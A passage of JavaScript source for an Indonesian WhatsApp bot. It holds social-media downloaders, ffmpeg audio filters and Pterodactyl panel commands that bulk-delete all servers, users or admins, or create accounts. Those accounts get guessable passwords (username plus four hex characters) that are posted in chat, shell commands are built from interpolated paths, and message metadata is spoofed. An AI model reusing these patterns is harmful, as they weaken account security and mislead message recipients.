    for (const [index, media] of result.media.entries()) {
      try {
        const mediaCaption = result.media.length > 1 
          ? `${captionText}\n\n📊 *Media ${media.index}/${result.media.length}*`
          : captionText

        if (media.type === 'video') {
          await sock.sendMessage(m.chat, {
            video: { url: media.url },
            caption: mediaCaption,
            mimetype: 'video/mp4'
          }, { quoted: m })
        } else {
          await sock.sendMessage(m.chat, {
            image: { url: media.url },
            caption: mediaCaption
          }, { quoted: m })
        }
        
        if (result.media.length > 1 && index < result.media.length - 1) {
          await new Promise(resolve => setTimeout(resolve, 1500))
        }
      } catch (err) {
        console.error(`Error sending media ${media.index}:`, err)
        await m.reply(`❌ Gagal mengirim media ${media.index}`)
      }
    }

  } catch (error) {
    console.error('Error in Instagram handler:', error)
    await m.reply(`❌ *Terjadi kesalahan!*\n\n${error.message || 'Gagal mengunduh media'}`)
  }
  }
  break

case 'gddl':
    case 'gdrive': {

try {
        if (!text) return m.reply(`Contoh: ${cmd} linknya`)
        
        let hao = await fetchJson(`https://api.siputzx.my.id/api/d/gdrive?url=${text}`)
        let fileName = hao.data.name
        return await sock.sendMessage(m.chat, {
          document: {
            url: hao.data.download
          },
          mimetype: 'application/zip',
          fileName: fileName
        }, {
          quoted: fakeQuoted
        })
      } catch (err) {
        console.error('Kesalahan pada API:', err)
        m.reply('Terjadi kesalahan')
      }
    }
    break
case 'mediafire': 
case 'mediafiredl': 
case 'mfdl': {
    if (!text) return m.reply(`❌ Masukkan link Mediafire!\n\n📌 Contoh:\n${prefix + command} https://www.mediafire.com/file/xxxxxx`)
    if (!isUrl(text) || !text.includes('mediafire.com')) return m.reply('❌ Link tidak valid! Pastikan itu link Mediafire.')

    m.reply('⏳ Sedang memproses link Mediafire...')

    try {
        const data = await mediafire(text)
        if (!data || !data.downloadUrl) return m.reply('❌ Gagal mengambil data dari Mediafire.')

        let caption = `📦 *MEDIAFIRE DOWNLOADER*\n\n`
        caption += `🗂️ Nama File: ${data.fileName}\n`
        caption += `📁 Ukuran: ${data.fileSize}\n`
        caption += `📅 Upload: ${data.uploadDate}\n`
        caption += `📄 Mime: ${data.mimeType || 'Tidak diketahui'}\n`
        caption += `\n🔗 *Link Download:* ${data.downloadUrl}`

        // Kirim info file terlebih dahulu
        await sock.sendMessage(m.chat, { text: caption }, { quoted: fakeQuoted })

        // Coba kirim file langsung (jika ukuran memungkinkan)
        if (data.downloadUrl && data.fileSize && !data.fileSize.includes('GB')) {
            await sock.sendMessage(
                m.chat,
                {
                    document: { url: data.downloadUrl },
                    mimetype: data.mimeType || 'application/octet-stream',
                    fileName: data.fileName
                },
                { quoted: fakeQuoted }
            )
        } else {
            m.reply('⚠️ File terlalu besar untuk dikirim langsung.\nSilakan unduh manual melalui link di atas.')
        }

    } catch (e) {
        console.error(e)
        m.reply('❌ Terjadi kesalahan saat memproses link Mediafire.')
    }
}
break
case 'douyin':
case 'capcut':
case 'threads':
case 'kuaishou':
case 'qq':
case 'espn':
case 'pinterest':
case 'imdb':
case 'imgur':
case 'ifunny':
case 'izlesene':
case 'reddit':
case 'youtube':
case 'twitter':
case 'vimeo':
case 'snapchat':
case 'bilibili':
case 'dailymotion':
case 'sharechat':
case 'likee':
case 'linkedin':
case 'tumblr':
case 'hipi':
case 'telegram':
case 'getstickerpack':
case 'bitchute':
case 'febspot':
case '9gag':
case 'oke.ru':
case 'rumble':
case 'streamable':
case 'ted':
case 'sohutv':
case 'pornbox':
case 'xvideos':
case 'xnxx':
case 'kuaishou':
case 'xiaohongshu':
case 'ixigua':
case 'weibo':
case 'miaopai':
case 'meipai':
case 'xiaoying':
case 'national video':
case 'yingke':
case 'sina':
case 'bluesky':
case 'soundcloud':
case 'mixcloud':
case 'spotify':
case 'zingmp3':
case 'bandcamp':
case 'download':
case "aio": {
      if (!q) return reply('link Sosmed?')
   try {
    async function fetchInitialPage(initialUrl) {
      try {
        const axios = require('axios')
        const cheerio = require('cheerio')
        const headers = {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
          'Referer': initialUrl,
        }
        const response = await axios.get(initialUrl, { headers })
        const $ = cheerio.load(response.data)
        const csrfToken = $('meta[name="csrf-token"]').attr('content')
        if (!csrfToken) throw new Error('Gagal nemu token keamanan, coba lagi!')
        let cookies = ''
        if (response.headers['set-cookie']) {
          cookies = response.headers['set-cookie'].join('; ')
        }
        return { csrfToken, cookies }
      } catch (error) {
        throw new Error(`Gagal ambil halaman awal: ${error.message}`)
      }
    }
    async function postDownloadRequest(downloadUrl, userUrl, csrfToken, cookies) {
      try {
        const axios = require('axios')
        const headers = {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
          'Referer': 'https://on4t.com/online-video-downloader',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Accept': '*/*',
          'X-Requested-With': 'XMLHttpRequest',
          'Cookie': cookies
        }
        const postData = new URLSearchParams()
        postData.append('_token', csrfToken)
        postData.append('link[]', userUrl)
        const response = await axios.post(downloadUrl, postData.toString(), { headers })
        if (response.data?.result?.length) {
          return response.data.result.map(item => ({
            title: item.title,
            thumb: item.image,
            url: item.video_file_url || item.videoimg_file_url
          }))
        } else {
          throw new Error('Respons dari server gak sesuai harapan, coba link lain!')
        }
      } catch (error) {
        throw new Error(`Gagal proses permintaan download: ${error.message}`)
      }
    }
    async function sendMediaAutoType(url, title) {
      try {
        const axios = require('axios')
        const { fromBuffer } = require('file-type')   
        const res = await axios.get(url, { responseType: 'arraybuffer' })
        const buff = Buffer.from(res.data)
        const fileInfo = await fromBuffer(buff)
        if (!fileInfo) return reply(`Gagal deteksi tipe file: ${title}`)
        let mime = fileInfo.mime
        let ext = fileInfo.ext
        if (mime.startsWith('video/')) {
          await sock.sendMessage(m.chat, { video: buff, caption: title }, { quoted: m })
        } else if (mime.startsWith('audio/')) {
          await sock.sendMessage(m.chat, { audio: buff, mimetype: mime }, { quoted: m })
        } else if (mime.startsWith('image/')) {
          await sock.sendMessage(m.chat, { image: buff, caption: title }, { quoted: m })
        } else {
          await sock.sendMessage(m.chat, {
            document: buff,
            fileName: `${title}.${ext}`,
            mimetype: mime
          }, { quoted: m })
        }
      } catch (err) {
        reply(`Gagal kirim media: ${err.message}`)
      }
    }
    const initialUrl = 'https://on4t.com/online-video-downloader'
    const downloadUrl = 'https://on4t.com/all-video-download'
    const { csrfToken, cookies } = await fetchInitialPage(initialUrl)
    const results = await postDownloadRequest(downloadUrl, q, csrfToken, cookies)
    for (let i = 0; i < results.length; i++) {
      await sendMediaAutoType(results[i].url, results[i].title)
    }
    await sock.sendMessage(m.chat, { react: { text: '💕', key: m.key } })
  } catch (err) {
    await sock.sendMessage(m.chat, { react: { text: '😳', key: m.key } }) 
    reply(err.message)
  }
break;
}
case "snackvideo":
      case "sv":
        {
        
          if (!text) {
            return reply(`mana link-nya? contoh: ${cmd} https://url/reel/xxx/?igsh=xxx`);
            React()
          }
          let memek = await snck(text);
          let respon = memek.data;
          if (respon && respon.length > 0) {
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
              for (let mediaUrl of uniqueUrls) {
                const headResponse = await axios.head(mediaUrl);
                const mimeType = headResponse.headers["content-type"];
                const isImage = /image\/.*/.test(mimeType);
                const isVideo = /video\/.*/.test(mimeType);
                if (isImage) {
                  await sock.sendMessage(m.chat, {
                    image: {
                      url: mediaUrl
                    },
                    caption: "berhasil mendownload gambar dari URL.",
                    contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: name,
body: `version • ${version}`,
thumbnailUrl: thumbnail2,
sourceUrl: `https://Uptime • ${runtime(process.uptime())}`,
mediaType: 1,
renderLargerThumbnail: false,
}}
                  }, {
                    quoted: fakeQuoted
                  });
                } else if (isVideo || mimeType === "application/octet-stream") {
                  await sock.sendMessage(m.chat, {
                    video: {
                      url: mediaUrl
                    },
                    caption: " "
                  }, {
                    quoted: fakeQuoted
                  });
                } else {
                  await sock.sendMessage(m.chat, {
                    text: `tipe media tidak didukung: ${mimeType}`
                  }, {
                    quoted: fakeQuoted
                  });
                }
              }
            } catch (error) {
              console.error("Error fetching media type:", error);
              reply(error);
            }
          } else {
            await sock.sendMessage(m.chat, {
              text: "Tidak ditemukan media atau terjadi kesalahan saat mengambil media."
            }, {
              quoted: fakeQuoted
            });
          }
        }
        break;
case "tiktok":
      case "tt":
        {
        
          let momok = "`𝗧 𝗜 𝗞 𝗧 𝗢 𝗞 - 𝗗 𝗢 𝗪 𝗡 𝗟 𝗢 𝗔 𝗗`";
          if (!text.startsWith("https://")) {
            return reply("url");
          }
          await tiktokDl(q).then(async result => {
            await sock.sendMessage(m.chat, {
              react: {
                text: "🕖",
                key: m.key
              }
            });
            if (!result.status) {
              return reply("Error!");
            }
            if (result.durations == 0 && result.duration == "0 Seconds") {
              let araara = new Array();
              let urutan = 0;
              for (let a of result.data) {
                let imgsc = await prepareWAMessageMedia({
                  image: {
                    url: `${a.url}`
                  }
                }, {
                  upload: sock.waUploadToServer
                });
                await araara.push({
                  header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: `Foto Slide Ke *${urutan += 1}*`,
                    hasMediaAttachment: true,
                    ...imgsc
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                  })
                });
              }
              const msgii = await generateWAMessageFromContent(m.chat, {
                viewOnceMessageV2Extension: {
                  message: {
                    messageContextInfo: {
                      deviceListMetadata: {},
                      deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: "*TIKTOK - DOWNLOADER*"
                      }),
                      carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: araara
                      })
                    })
                  }
                }
              }, {
                userJid: m.sender,
                quoted: fakeQuoted
              });
              await sock.relayMessage(m.chat, msgii.message, {
                messageId: msgii.key.id
              });
            } else {
              let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark");
              await sock.sendMessage(m.chat, {
                video: {
                  url: urlVid.url
                },
                caption: momok,
                footer: `\n${namaBot}`,
                buttons: [{
                  buttonId: `.ttaudio ${text}`,
                  buttonText: {
                    displayText: "ᴀᴍʙɪʟ ᴍᴜsɪᴋɴʏᴀ"
                  }
                }],
                viewOnce: true
              }, {
                quoted: fakeQuoted
              });
            }
          }).catch(e => console.log(e));
          await sock.sendMessage(m.chat, {
            react: {
              text: "✅",
              key: m.key
            }
          });
        }
        break;
        // Funcc
        
        //
        case 'audiotiktok':
    case 'tiktokaudio':
    case 'audiott':
    case 'ttaudio': {

try {
        if (!text) return m.reply(`Contoh: ${cmd} linknya`)
        if (!text.includes('tiktok.com')) return m.reply('Harus berupa link tiktok!')
       
        let jir = await tiktokDl(text)
        if (jir.status && jir.data.length > 0) {
          const nowmVideo = jir.data.find(item => item.type === 'nowatermark')
          if (nowmVideo) {
            let audioq = nowmVideo.url
            return await
            sock.sendMessage(m.chat, {
              audio: {
                url: audioq
              },
              mimetype: 'audio/mpeg',
              contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: name,
body: `version • ${version}`,
thumbnailUrl: thumbnail2,
sourceUrl: `https://Uptime • ${runtime(process.uptime())}`,
mediaType: 1,
renderLargerThumbnail: false,
}}
            }, {
              quoted: fakeQuoted
            })

          }
        }
        throw new Error('Terjadi kesalahan')
      } catch (err) {
        console.error('Terjadi kesalahan: ', err)
        m.reply('Terjadi kesalahan')
      }
    }
    break
case "tiktoksearch":
case "ttsearch":
case "tts": {
      if (!text) return m.reply(`⚠️ Eits, kakak lupa kasih kata kunci! 😗 Coba ketik kayak gini ya: *.${command} jj epep* biar Mora bisa bantu cari yang kakak mau! 🔍💬`);
      try {
        let search = await tiktokSearchVideo(text);
        let teks = `🎥 *${search.videos[0].title}*\n\n` +
          `*ᴠɪᴅᴇᴏɪ ɪᴅ* : ${search.videos[0].video_id}\n` +
          `*ᴜsᴇʀɴᴀᴍᴇ* : ${search.videos[0].author.unique_id}\n` +
          `*ɴɪᴄᴋɴᴀᴍᴇ* : ${search.videos[0].author.nickname}\n` +
          `*ᴅᴜʀᴀᴛɪᴏɴ* : ${search.videos[0].duration} detik\n` +
          `*ʟɪᴋᴇ* : ${search.videos[0].digg_count}\n` +
          `*ᴄᴏᴍᴍᴇɴᴛ* : ${search.videos[0].comment_count}\n` +
          `*sʜᴀʀᴇ* : ${search.videos[0].share_count}\n\n` +
          `*ʟɪɴᴋ*: https://www.tiktok.com/@${search.videos[0].author.unique_id}/video/${search.videos[0].video_id}`;

        let list = '';
        let no = 1;
        for (let i of search.videos) {
          list += `\n${no++}. 🎵 *${i.title}*\n` +
            `ᴅᴜʀᴀsɪ: ${i.duration} ᴅᴇᴛɪᴋ\n` +
            `ʟɪᴋᴇ: ${i.digg_count}\n` +
            `ᴄᴏᴍᴍᴇɴᴛs: ${i.comment_count}\n` +
            `sʜᴀʀᴇs: ${i.share_count}\n` +
            ` ʟɪɴᴋ: https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}\n`;
        }

        await sock.sendMessage(
          m.chat, {
            video: {
              url: `https://tikwm.com${search.videos[0].play}`
            },
            mimetype: 'video/mp4',
            seconds: 31622400000,
            fileLength: 99999999999999
          }, {
            quoted: fakeQuoted
          }
        );

        if (search.videos.length > 1) {
          await sock.sendMessage(
            m.chat, {
              text: `📚 *ᴅᴀғᴛᴀʀ ᴠɪᴅᴇᴏ ʟᴀɪɴɴʏᴀ:*\n${list}`
            }, {
              quoted: fakeQuoted
            }
          );
        }
      } catch (error) {
        console.log(error);
      }
    }
    break
    case "ytmp4": {

if (!text) return reply(`*Penggunaan Salah!*\ncontoh: ${cmd} (link)`)
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await sock.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await ytdl.ytmp4(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await sock.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: fakeQuoted})
} else {
return m.reply("Error! Result Not Found")
}
await sock.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case "ytmp3": {

if (!text) return reply(`*Penggunaan Salah!*\ncontoh: .ytmp3 (link)`)
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await sock.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})

var anu = await ytdl.ytmp3(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await sock.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: fakeQuoted})
} else {
return m.reply("Error! Result Not Found")
}
await sock.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case 'yts': case 'ytsearch': {

if (!text) return reply(`Example : ${cmd} story wa anime`)
 let [l, r] = text.split`|`
 if (!l) l = ''
 if (!r) r = ''
 const more = String.fromCharCode(8206)
 const readMore = more.repeat(4001)
 let redmo = l + readMore + r
 let anu = (await yts(text)).all
 let video = anu.filter(v => v.type === 'video') 
let channel = anu.filter(v => v.type === 'channel') 
let teks = `*${monospa('Hasil Pencarian YouTube 👇')}*\n${redmo}${channel.map(v => `*${v.name}* (${v.url})\n_${v.subCountLabel} (${v.subCount}) Subscriber_\n${v.videoCount} video\n========================`.trim()

).join("\n")}`+`${video.map(v => `*${v.title}* (${v.url})\nDuration: ${v.timestamp}\nUploaded ${v.ago}
\n${v.views} views\n========================`.trim() ).join("\n")}`
let image = channel.length ? channel[0].image : video.length ? video[0].image : urlmenu.main

let sections = [{
		title: global.namebot2, 
		highlight_label: 'start chats', 
		rows: [{
			header: global.namebot2, 
	title: "Menu",
	description: `kembali ke menu !`, 
	id: '.menu'
	},
	{
		header: global.namebot2, 
		title: "Owner Bot", 
		description: "Owner bot, pemilik bot", 
		id: '.owner'
	}]
}]

video.forEach(async(data) => {
sections.push({
	title: data.title, 
	rows: [{
		title: "Get Video", 
		description: `Get video from "${data.title}"`, 
		id: `.ytmp4 ${data.url}`
		}, 
		{
		title: "Get Audio", 
		description: `Get audio from "${data.title}"`, 
		id: `.ytmp3 ${data.url}`
		}]
	}) 
}) 
let listMessage = {
    title: 'Download Media!!', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: teks
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: global.namebot2
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 subtitle: global.namebot2,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: image }}, { upload: sock.waUploadToServer })) 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "single_select",
 "buttonParamsJson": JSON.stringify(listMessage) 
 }, 
 ],
 })
 })
 }
 }
}, {})

await sock.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break 
case 'play':
case 'song': {

if (!text) return reply(`*Penggunaan Salah!*\ncontoh: ${cmd} Night change`)
React()
let ytsSearchh = await yts(text)
const rees = await ytsSearchh.all[0]
var anu = await ytdl.ytmp3(`${rees.url}`)
let urlMp3 = anu.download.url
 await sock.sendMessage(m.chat, {
          audio: {
            url: urlMp3
          },
          mimetype: 'audio/mpeg',
          fileLength: 99999999999999,
           contextInfo: {
isForwarded: false, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: "120363423889841112@g.us" }, forwardedNewsletterMessageInfo: { newsletterName: `${namaBot}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: `${rees.title}`, 
thumbnailUrl: rees.thumbnail, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}}, {quoted: qkontak })
 }
if (anu.status) {

} else {
return m.reply("Error! Result Not Found")
}
break
//
//
    case 'pin':
    case 'pinterest': {

      if (!text) return reply(`Format salah, contoh: \n${ command} Anime`)
      if (budy.match(`tobrut|susu|seksi|sexy`)) return reply('GABOLEH YA, INGAT AKHIRAT INGAT TUHAN!');
      await sock.sendMessage(m.chat, {
        react: {
          text: '⏳',
          key: m.key
        }
      })

      let anutrest = await pinterest(text) // Ambil hasil pencarian
      if (!anutrest || anutrest.length === 0) return reply("Error, Foto Tidak Ditemukan")

      // Ambil maksimal 10 gambar biar nggak terlalu panjang
      let selectedImages = anutrest.slice(0, 10);
      let anu = []

      for (let i = 0; i < selectedImages.length; i++) {
        let imgsc = await prepareWAMessageMedia({
          image: {
            url: selectedImages[i].image
          }
        }, {
          upload: sock.waUploadToServer
        })

        anu.push({
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Gambar ke *${i + 1}*`,
            hasMediaAttachment: true,
            ...imgsc
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [{
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "Lihat di Pinterest",
                url: selectedImages[i].source || selectedImages[i].image
              })
            }]
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: namaBot
          })
        })
      }

      // Buat format `carouselMessage`
      const msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `🔎 Berikut hasil pencarian gambar untuk *${text}*`
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: anu
              })
            })
          }
        }
      }, {
        userJid: sender,
        quoted: fakeQuoted
      })

      sock.relayMessage(m.chat, msg.message, {
        messageId: msg.key.id
      })
    }
 
    break
   /*
      CONVERT
   */
   case 'bass':
			case 'blown':
			case 'deep':
			case 'earrape':
			case 'fast':
			case 'fat':
			case 'nightcore':
			case 'reverse':
			case 'robot':
			case 'slow':
			case 'smooth':
			case 'tupai': {
			
				try {
					let set
					if(/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
					if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
					if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
					if (/earrape/.test(command)) set = '-af volume=12'
					if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
					if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
					if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
					if (/reverse/.test(command)) set = '-filter_complex "areverse"'
					if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
					if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
					if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
					if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
					if (/audio/.test(mime)) {
						await sock.sendMessage(m.chat, {
							react: {
								text: "⏱️",
								key: m.key,
							}
						})
						let media = await sock.downloadAndSaveMediaMessage(quoted)
						let ran = getRandom('.mp3')
						exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
							fs.unlinkSync(media)
							if (err) return m.reply(err)
							let buff = fs.readFileSync(ran)
							sock.sendMessage(m.chat, {
								audio: buff,
								mimetype: 'audio/mpeg'
							}, {
								quoted: fakeQuoted
							})
							fs.unlinkSync(ran)
						})
					} else m.reply(`Balas audio yang ingin diubah dengan caption *${cmd}*`)
				} catch (error) {
					 
				}
			}
			break
// #  # # # CPANEL # # #
// ===============================
// CLEAR SERVER
// ===============================
case "clearserver": {
    if (!isOwner) return reply(mess.owner)
const data = await ptlaRequest("/api/application/servers");

    if (!data || !data.data) return reply("❌ Tidak bisa mengambil data server!");

    let total = 0;
    for (let srv of data.data) {
        const id = srv.attributes.id;
        await ptlaRequest(`/api/application/servers/${id}`, "DELETE");
        total++;
    }

    reply(`✔️ ${total} server berhasil dihapus (ptla).`);
}
break;



// ===============================
// CLEAR USER
// ===============================
case "clearuser": {
    if (!isOwner) return reply(mess.owner)
const data = await ptlaRequest("/api/application/users");

    if (!data || !data.data) return reply("❌ Tidak bisa mengambil data user!");

    let total = 0;
    for (let user of data.data) {
        const id = user.attributes.id;
        await ptlaRequest(`/api/application/users/${id}`, "DELETE");
        total++;
    }

    reply(`🧹 ${total} user berhasil dihapus (ptla).`);
}
break;



// ===============================
// CLEAR ADMIN
// ===============================
case "clearadmin": {
    if (!isOwner) return reply(mess.owner)
const data = await ptlaRequest("/api/application/users");

    if (!data || !data.data) return reply("❌ Tidak bisa mengambil data admin!");

    let total = 0;
    for (let user of data.data) {
        // hanya delete root_admin = true
        if (user.attributes.root_admin) {
            const id = user.attributes.id;
            await ptlaRequest(`/api/application/users/${id}`, "DELETE");
            total++;
        }
    }

    reply(`🗑️ ${total} admin berhasil dihapus (ptla).`);
}
break;
case "cadmin": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply("username")
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
try {
    const msg = generateWAMessageFromContent(m.sender, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    // BODY = TEKS UTAMA PESAN
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: teks // <-- pastikan variabel teks terdefinisi
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: name || teks,
                        subtitle: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Copy User",
                                    id: user.username,
                                    copy_code: user.username
                                })
                            },
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Copy Password",
                                    id: password.toString(),
                                    copy_code: password.toString()
                                })
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Login",
                                    url: global.domain,
                                    merchant_url: global.domain
                                })
                            }
                        ]
                    })
                })
            }
        }
    }, {});

    await sock.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });

} catch (e) {
    console.error('❌ Error mengirim tombol salin:', e);
}
break
}
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isOwner && !isPremium) return reply(mess.owner)
if (!text) return m.reply("username")
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = (username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
